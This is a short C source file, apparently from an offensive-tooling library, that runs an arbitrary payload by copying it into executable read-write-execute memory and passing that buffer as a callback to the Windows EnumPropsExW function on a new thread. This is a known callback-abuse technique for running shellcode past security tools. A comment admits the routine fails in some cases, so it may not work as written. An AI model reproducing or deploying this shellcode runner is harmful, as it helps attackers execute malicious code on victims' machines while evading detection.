#include "Win32Helper.h"

VOID InvokeEnumPropsExWCallbackRoutine(LPVOID lpParameter)
{
	/*
	
	THIS FUNCTION FAILS- NOTE

	GetTopWindow function (winuser.h)

	If the function succeeds, the return value is a handle to the child window at the top 
	of the Z order. If the specified window has no child windows, the return value is NULL. 
	To get extended error information, use the GetLastError function.
	
	*/

	EnumPropsExW(GetTopWindow(NULL), (PROPENUMPROCEXW)lpParameter, NULL);
}

BOOL MpfSceViaEnumPropsExW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumPropsExWCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}